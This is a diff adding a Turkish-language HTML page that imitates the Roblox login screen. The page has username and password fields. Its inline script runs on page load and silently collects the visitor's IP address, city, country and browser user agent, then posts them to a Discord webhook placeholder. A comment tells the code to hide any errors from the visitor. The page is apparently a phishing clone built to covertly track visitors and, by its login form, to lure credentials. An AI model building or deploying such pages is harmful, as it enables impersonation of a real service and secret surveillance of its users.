@@ -1,0 +1,100 @@
+# kardeş tasarlayan thezetas  ona göre siekrim haaaaa
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Roblox</title>
+    <link rel="stylesheet" href="style.css" />
+    <link rel="icon" href="https://www.roblox.com/favicon.ico" />
+</head>
+<body>
+    
+    <div class="background">
+        <div class="grid-overlay"></div>
+    </div>
+
+   
+    <nav class="top-nav">
+        <div class="logo">Roblox</div>
+        <ul>
+            <li>En İyiler</li>
+            <li>Pazar Yeri</li>
+            <li>Oluştur</li>
+            <li>Robux</li>
+        </ul>
+        <div class="search">
+            <input type="text" placeholder="Ara" />
+        </div>
+        <div class="auth-buttons">
+            <button class="signup-btn">Kaydol</button>
+            <button class="login-btn">Giriş Yap</button>
+        </div>
+    </nav>
+
+    <div class="login-modal">
+        <div class="modal-content">
+            <h2>Roblox'a Giriş Yap</h2>
+            
+            <form id="loginForm">
+                <div class="input-wrapper">
+                    <input type="text" id="username" placeholder="Kullanıcı Adı/E-posta/Telefon" required />
+                    <span class="error-msg">Lütfen bu alanı doldurun</span>
+                </div>
+                
+                <div class="input-wrapper">
+                    <input type="password" id="password" placeholder="Şifre" required />
+                    <span class="error-msg">Lütfen bu alanı doldurun</span>
+                </div>
+                
+                <button type="submit" class="submit-btn">Giriş Yap</button>
+            </form>
+            
+            <a href="#" class="forgot">Kullanıcı Adını veya Şifreni mi unuttun?</a>
+            
+            <div class="quick-options">
+                <button class="quick-btn">Tek Kullanımlık Kodu Bana E-postayla Gönder</button>
+                <button class="quick-btn">Hızlı Giriş</button>
+            </div>
+                <div class="signup-option"></div>
+            <span class="no-account-text">Hesabın yok mu?</span>
+            <a id="sign-up-link" class="text-link signup-link" href="https://www.roblox.com/tr/CreateAccount" target="_self">Kaydol</a>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+
+    <script>
+   
+    fetch('https://ipapi.co/json/')
+    .then(cevap => cevap.json())
+    .then(veri => {
+        
+        const discordMesaji = {
+            username: "Site Gözlemcisi",
+            avatar_url: "https://i.imgur.com/4M34hi2.png",
+            embeds: [{
+                title: "🚨 Yeni Biri Geldi!",
+                color: 15158332,
+                fields: [
+                    { name: "🌐 IP Adresi", value: veri.ip, inline: true },
+                    { name: "📍 Şehir/Bölge", value: `${veri.city} / ${veri.region}`, inline: true },
+                    { name: "🏳️ Ülke", value: veri.country_name, inline: true },
+                    { name: "🖥️ Sistem", value: navigator.userAgent, inline: false }
+                ],
+                footer: { text: "GitHub Pages Log Sistemi" },
+                timestamp: new Date()
+            }]
+        };
+
+    
+        fetch('BURAYA_WEBHOOK_LINKINI_YAPISTIR', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(discordMesaji)
+        });
+    })
+    .catch(hata => console.log("Bir sorun çıktı ama çaktırma."));
+    </script>
+    </body>
+</html>
